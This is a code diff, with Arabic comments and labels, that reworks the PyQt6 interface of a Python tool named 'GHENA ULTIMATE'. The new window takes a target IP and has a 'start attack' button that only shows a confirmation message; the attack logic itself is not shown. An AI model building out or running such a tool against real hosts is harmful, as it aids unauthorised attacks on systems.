-        core.save_state()
+        print(f"{COLORS['FAIL']}❌ خطأ: {e}{COLORS['ENDC']}")
 
-# ======================= الواجهة الرسومية (GUI) إذا كانت PyQt6 متوفرة =======================
+# ======================= الواجهة الرسومية (اختياري) =======================
 if GUI_AVAILABLE:
     class GhenaGUI(QMainWindow):
         def __init__(self):
             super().__init__()
-            self.core = None
-            self.setup_ui()
-            
-        def setup_ui(self):
             self.setWindowTitle(f"GHENA ULTIMATE v{VERSION}")
-            self.setMinimumSize(1200, 800)
-            # يمكن إعادة استخدام الكود السابق مع بعض التعديلات
-            # (سأختصر هنا لتجنب التكرار)
-            label = QLabel("الواجهة الرسومية قيد التطوير، استخدم CLI حالياً.", self)
-            label.move(50, 50)
+            self.setMinimumSize(800, 600)
+            
+            # واجهة بسيطة
+            widget = QWidget()
+            layout = QVBoxLayout()
+            
+            label = QLabel("GHENA ULTIMATE - جاهز للعمل")
+            label.setStyleSheet("font-size: 20px; color: #00ff00;")
+            layout.addWidget(label)
+            
+            self.ip_input = QLineEdit()
+            self.ip_input.setPlaceholderText("أدخل IP الهدف")
+            layout.addWidget(self.ip_input)
+            
+            self.start_btn = QPushButton("🚀 بدء الهجوم")
+            self.start_btn.clicked.connect(self.start_attack)
+            layout.addWidget(self.start_btn)
+            
+            widget.setLayout(layout)
+            self.setCentralWidget(widget)
             
         def start_attack(self):
-            # هنا يتم إنشاء core وتشغيله في Thread منفصل
-            pass
+            ip = self.ip_input.text().strip()
+            if ip:
+                QMessageBox.information(self, "تم", f"بدء الهجوم على {ip}")
+                # هنا يتم تشغيل الهجوم في Thread منفصل
 
 # ======================= نقطة البداية =======================
 if __name__ == "__main__":
-    if GUI_AVAILABLE:
+    if GUI_AVAILABLE and len(sys.argv) > 1 and sys.argv[1] == "--gui":
         app = QApplication(sys.argv)
         window = GhenaGUI()
         window.show()
         sys.exit(app.exec())
     else:
-        main_cli()
+        main()
